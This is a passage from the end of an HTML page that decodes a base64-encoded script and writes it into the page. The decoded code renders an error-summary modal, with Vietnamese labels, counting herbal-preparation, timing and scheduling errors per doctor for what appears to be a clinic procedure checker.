vY3RvcnMgPSBBcnJheS5mcm9tKG1hcC5lbnRyaWVzKCkpLnNvcnQoKGEsYik9PmJbMV0udG90YWwgLSBhWzFdLnRvdGFsKTsNCg0KICBsZXQgaHRtbCA9IGA8aDQgc3R5bGU9Im1hcmdpbjoxMHB4IDAgNnB4Ij4ke3RpdGxlfTwvaDQ+PGRpdiBzdHlsZT0iYm9yZGVyOjFweCBzb2xpZCAjZWVlO2JvcmRlci1yYWRpdXM6OHB4O3BhZGRpbmc6MTJweCI+YDsNCiAgZG9jdG9ycy5mb3JFYWNoKChbZG9jdG9yLCBpbmZvXSk9PnsNCiAgICBodG1sICs9IGA8ZGl2IHN0eWxlPSJtYXJnaW4tYm90dG9tOjEwcHgiPg0KICAgICAgPGRpdj5Cw6FjIHPEqSA8Yj4ke2RvY3Rvcn06PC9iPiAke2luZm8udG90YWx9PC9kaXY+YDsNCiAgICBpZiAoc2hvd09wZXJhdG9ycyl7DQogICAgICBjb25zdCBvcHMgPSBBcnJheS5mcm9tKGluZm8uYnlPcGVyYXRvci5lbnRyaWVzKCkpLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgICBpZihvcHMubGVuZ3RoKXsNCiAgICAgICAgaHRtbCArPSBgPGRpdiBzdHlsZT0ibWFyZ2luLWxlZnQ6MTJweDttYXJnaW4tdG9wOjRweCI+YCArDQogICAgICAgICAgICAgICAgb3BzLm1hcCgoW29wLGNdKSA9PiBgLSAke29wfTogJHtjfWApLmpvaW4oJzxicj4nKSArDQogICAgICAgICAgICAgICAgYDwvZGl2PmA7DQogICAgICB9DQogICAgfQ0KICAgIGh0bWwgKz0gYDwvZGl2PmA7DQogIH0pOw0KICBodG1sICs9IGA8L2Rpdj5gOw0KICByZXR1cm4gaHRtbDsNCn0NCg0KICBmdW5jdGlvbiBidWlsZFN1bW1hcnlIVE1MKCl7DQogICAgY29uc3QgaGVyYk1hcCA9IGNvdW50SGVyYigpOw0KICAgIGNvbnN0IHRpbWVNYXAgPSBjb3VudFRpbWVFcnJvcnMoKTsNCiAgICBjb25zdCBjb25mTWFwID0gY291bnRDb25mbGljdHMoKTsNCg0KICAgIC8vIFThu5VuZyBuaGFuaCAoZMOybmcgxJHhuqd1KQ0KICAgIGNvbnN0IGhlcmJUb3RhbCA9IEFycmF5LmZyb20oaGVyYk1hcC52YWx1ZXMoKSkucmVkdWNlKChzLGIpPT5zK2IudG90YWwsMCk7DQogICAgY29uc3QgdGltZVRvdGFsID0gQXJyYXkuZnJvbSh0aW1lTWFwLnZhbHVlcygpKS5yZWR1Y2UoKHMsYik9PnMrYi50b3RhbCwwKTsNCiAgICBjb25zdCBjb25mVG90YWwgPSBBcnJheS5mcm9tKGNvbmZNYXAudmFsdWVzKCkpLnJlZHVjZSgocyxiKT0+cytiLnRvdGFsLDApOw0KDQogICAgbGV0IHRvcCA9IGAgPGRpdiBjbGFzcz0ic3VtbWFyeS13cmFwIj4NCiAgICAgIDxkaXYgY2xhc3M9ImtwaS1ncmlkIj4NCiAgICAgICAgPGRpdiBjbGFzcz0ia3BpLWNhcmQga3BpLWJsdWUiPg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS10aXRsZSI+PGkgY2xhc3M9ImZhLXNvbGlkIGZhLW1vcnRhci1wZXN0bGUiPjwvaT4gU+G6r2MgdGh14buRYyB0aGFuZzwvZGl2Pg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS12YWx1ZSI+JHtoZXJiVG90YWx9PC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJrcGktY2FyZCBrcGktYW1iZXIiPg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS10aXRsZSI+PGkgY2xhc3M9ImZhLXJlZ3VsYXIgZmEtY2xvY2siPjwvaT4gU2FpIHRo4budaSBnaWFuPC9kaXY+DQogICAgICAgICAgPGRpdiBjbGFzcz0ia3BpLXZhbHVlIj4ke3RpbWVUb3RhbH08L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgICAgIDxkaXYgY2xhc3M9ImtwaS1jYXJkIGtwaS1yZWQiPg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS10aXRsZSI+PGkgY2xhc3M9ImZhLXNvbGlkIGZhLXRyaWFuZ2xlLWV4Y2xhbWF0aW9uIj48L2k+IFRyw7luZyBnaeG7nTwvZGl2Pg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS12YWx1ZSI+JHtjb25mVG90YWx9PC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgPC9kaXY+YDsNCg0KICAgIHJldHVybiB0b3ANCiAgICAgICsgcmVuZGVyU2VjdGlvbignU+G6r2MgdGh14buRYyB0aGFuZycsIGhlcmJNYXAsIC8qc2hvd09wZXJhdG9ycyovIGZhbHNlKSANCiAgICAgICsgJzxici8+Jw0KICAgICAgKyByZW5kZXJTZWN0aW9uKCdTYWkgdGjhu51pIGdpYW4nLCB0aW1lTWFwKQ0KICAgICAgKyAnPGJyLz4nDQogICAgICArIHJlbmRlclNlY3Rpb24oJ1Ryw7luZyBnaeG7nScsIGNvbmZNYXApOw0KICB9DQoNCiAgLy8gTeG7ny/EkcOzbmcgbW9kYWwNCiAgd2luZG93Lm9wZW5FcnJvclN1bW1hcnkgPSBmdW5jdGlvbigpew0KICAgIGNvbnN0IG1vZGFsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlNb2RhbCcpOw0KICAgIGNvbnN0IGNvbnRlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VtbWFyeUNvbnRlbnQnKTsNCiAgICBpZighbW9kYWwgfHwgIWNvbnRlbnQpIHJldHVybjsNCi8vIGzhuqV5IDMgbWFwIMSR4buDIHRydXnhu4FuIGNobyBi4bqjbmcgeOG6v3AgaOG6oW5nDQpjb25zdCBoZXJiTWFwID0gY291bnRIZXJiKCk7DQpjb25zdCB0aW1lTWFwID0gY291bnRUaW1lRXJyb3JzKCk7DQpjb25zdCBjb25mTWFwID0gY291bnRDb25mbGljdHMoKTsNCg0KLy8gbuG7mWkgZHVuZyBwb3B1cCA9IHBo4bqnbiB0w7NtIHThuq90IGPFqSArIGLhuqNuZyB44bq/cCBo4bqhbmcgYsOhYyBzxKkNCmNvbnRlbnQuaW5uZXJIVE1MID0gYnVpbGRTdW1tYXJ5SFRNTCgpDQogICsgYnVpbGREb2N0b3JSYW5raW5nKGhlcmJNYXAsIHRpbWVNYXAsIGNvbmZNYXApOw0KICAgIG1vZGFsLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICB9Ow0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VtbWFyeUNsb3NlQnRuJyk/LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCk9PiB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlNb2RhbCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnOw0KICB9KTsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlCYWNrZHJvcCcpPy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdW1tYXJ5TW9kYWwnKS5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgfSk7DQoNCiAgLy8gU2F1IGtoaSDigJxLaeG7g20gVHJh4oCdIHhvbmcsIGhp4buHbiBuw7p0IFTDs20gVOG6r3QgTOG7l2kgKHRoZW8gY8O5bmcgY8ahIGNo4bq/IG5oxrAgMiBuw7p0IGtpYSkNCiAgLy8gKMSQw6MgY8OzIGxvZ2ljIGhp4buHbiBuw7p0IHRyb25nIHNldFRpbWVvdXQgc2F1IGFuYWx5emUg4oCUIHRhIGNo4buJIMSR4bqjbSBi4bqjbyBuw7p0IG7DoHkgY8WpbmcgaGnhu4duKQ0KICBjb25zdCBvcmlnID0gc2V0VGltZW91dDsNCiAgLy8gS2jDtG5nIGPhuqduIGhvb2ssIHbDrCBjb2RlIGPDsyDEkW/huqFuOg0KICAvLyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b24uYnRuJykuZm9yRWFjaChidG4gPT4gew0KICAvLyAgIGlmIChidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ0dp4budIHRy4buRbmcnKSB8fCBidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ1Phuq9jIHRodeG7kWMgdGhhbmcnKSkgeyBidG4uc3R5bGUuZGlzcGxheT0naW5saW5lLWJsb2NrJzt9DQogIC8vIH0pOw0KICAvLyAtPiBUYSB0aMOqbSBkw7JuZyBkxrDhu5tpIMSR4buDIG7DunQgbeG7m2kgY8WpbmcgxJHGsOG7o2MgYuG6rXQ6DQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKSA9PiB7DQogICAgLy8gS2hpIHBvcHVwIGxvYWRpbmcgdOG6r3Qgc2F1IGFuYWx5emUsIHRhIGLhuq10IHRo4bunIGPDtG5nIG7hur91IMSRw6MgY8OzIGThu68gbGnhu4d1Og0KICAgIC8vIChhbiB0b8OgbiBu4bq/dSBn4buNaSBuaGnhu4F1IGzhuqduKQ0KICAgIGNvbnN0IHNob3dJZkRhdGEgPSAoKSA9PiB7DQogICAgICBpZiAoQXJyYXkuaXNBcnJheSh3aW5kb3cuYWxsUHJvY2VkdXJlcykgJiYgd2luZG93LmFsbFByb2NlZHVyZXMubGVuZ3RoKXsNCiAgICAgICAgY29uc3QgYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclN1bW1hcnlCdG4nKTsNCiAgICAgICAgaWYgKGIpIGIuc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUtYmxvY2snOw0KICAgICAgfQ0KICAgIH07DQogICAgLy8gY2jhuqF5IG5nYXkgdsOgIHNhdSBt4buXaSBs4bqnbiBs4buNYy9yZW5kZXINCiAgICBzaG93SWZEYXRhKCk7DQogICAgLy8gZ+G6r24gdsOgbyBjw6FjIMSRaeG7g20gxJHDoyBjw7M6DQogICAgY29uc3QgcmIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0Qm9keScpOw0KICAgIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgY29uc3Qgb2JzID0gbmV3IE11dGF0aW9uT2JzZXJ2ZXIoc2hvd0lmRGF0YSk7DQogICAgaWYgKHJiKSBvYnMub2JzZXJ2ZShyYiwge2NoaWxkTGlzdDp0cnVlLHN1YnRyZWU6dHJ1ZX0pOw0KICAgIGlmIChlbCkgb2JzLm9ic2VydmUoZWwsIHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWV9KTsNCiAgfSk7DQp9KSgpOw0KPC9zY3JpcHQ+DQoNCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCkgPT4gew0KICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTdW1tYXJ5QnRuJyk7DQogIGNvbnN0IGhlcmJCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRvZ2dsZUJ0bicpOw0KICBjb25zdCBhdmFpbEJ0biA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2J1dHRvbi5idG5bb25jbGljaz0idG9nZ2xlQXZhaWxhYmlsaXR5KCkiXScpOw0KDQogIGZ1bmN0aW9uIHN5bmNTaG93KCl7DQogICAgaWYgKCFidG4pIHJldHVybjsNCiAgICBjb25zdCBoZXJiU2hvd24gID0gaGVyYkJ0biAmJiBnZXRDb21wdXRlZFN0eWxlKGhlcmJCdG4pLmRpc3BsYXkgIT09ICdub25lJzsNCiAgICBjb25zdCBhdmFpbFNob3duID0gYXZhaWxCdG4gJiYgZ2V0Q29tcHV0ZWRTdHlsZShhdmFpbEJ0bikuZGlzcGxheSAhPT0gJ25vbmUnOw0KICAgIGlmIChoZXJiU2hvd24gfHwgYXZhaWxTaG93bikgYnRuLnN0eWxlLmRpc3BsYXkgPSAnaW5saW5lLWJsb2NrJzsNCiAgfQ0KDQogIC8vIGNo4bqheSBuZ2F5IHbDoCBraGkgY8OzIHRoYXkgxJHhu5VpIGhp4buDbiB0aOG7iw0KICBzeW5jU2hvdygpOw0KICBuZXcgTXV0YXRpb25PYnNlcnZlcihzeW5jU2hvdykub2JzZXJ2ZShkb2N1bWVudC5ib2R5LCB7DQogICAgYXR0cmlidXRlczogdHJ1ZSwgc3VidHJlZTogdHJ1ZSwgYXR0cmlidXRlRmlsdGVyOiBbJ3N0eWxlJywnY2xhc3MnXQ0KICB9KTsNCn0pOw0KDQoNCjwvc2NyaXB0Pg0KDQo8L2JvZHk+DQoNCjwvaHRtbD4=";
  const binary = atob(base64);
  const bytes = new Uint8Array([...binary].map(c => c.charCodeAt(0)));
  const decoded = new TextDecoder("utf-8").decode(bytes);
  document.write(decoded);
</script>


</body>
</html>
